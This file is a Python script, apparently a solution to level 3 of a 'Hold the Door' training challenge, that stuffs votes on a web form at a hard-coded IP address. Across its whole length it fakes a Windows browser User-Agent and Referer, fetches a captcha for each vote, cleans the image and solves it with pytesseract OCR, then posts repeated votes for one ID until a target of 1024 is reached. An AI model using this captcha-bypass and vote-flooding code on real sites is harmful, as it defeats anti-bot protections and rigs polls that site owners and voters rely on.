"""Hodor 3
   Use: ./3.py
   The program obtain #votes current and just sending the necessary votes.
   send user windows headers
"""
from io import BytesIO
import requests
import pytesseract
from PIL import Image
import cv2

def cleanFile(filePath, newFilePath):
    image = Image.open(BytesIO(filePath))
    #Set a threshold value for the image, and save
    img_vl = image.convert("L")
    image = img_vl.point(lambda x: 0 if x < 143 else 255)
    image.save(newFilePath)
    return image
    

ID = 2224
votes = 1024
fail = 0
ok = 0
url = 'http://158.69.76.135/level3.php'
captcha = 'http://158.69.76.135/captcha.php'
data = {'id': str(ID), 'holdthedoor': 'Submit'}

headerwin = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
headers = {"User-Agent": headerwin, "Referer": url}
success = 'Hold the Door challenge - Level 3'

s = requests.Session()
s.headers.update(headers)
response = s.get(url)

txt = response.text.split()
try:
    txtid = txt.index(str(ID))
except:
    txtid = 0
votescurrent = 0
if ((txt[txtid+3]).isdigit()):
    votescurrent = int(txt[txtid+3])


for i in range(votescurrent, votes):
    response = s.get(url, headers=headers)
    key = response.cookies['HoldTheDoor']
    data = {'id': str(ID), 'holdthedoor': 'Submit', "key": key}
    data["key"] = key
    cookie = {"HoldTheDoor": key}

    r = s.get(captcha, headers=headers)
    f = open('captcha.png', 'wb')
    f.write(r.content)
    f.close()

    # img = cv2.imread("captcha.png")
    #readimg = pytesseract.image_to_string(Image.open('captcha.png'))
    img = cleanFile(r.content, 'captcha.png')
    #img = Image.open(BytesIO(r.content))

    readimg = pytesseract.image_to_string(img)
    data["captcha"] = readimg.strip()
    response1 = s.post(url, data=data, cookies=cookie, headers=headers)
    if response1.status_code is 200 and success in response1.text:
        ok += 1
        print("{} Ok   ".format(votescurrent), end='\r', flush=True)
    else:
        fail += 1
        print("{} Fail".format(fail), end='\r', flush=True)

print("fail {} correct {} actuales {}".format(fail, ok, votescurrent + ok))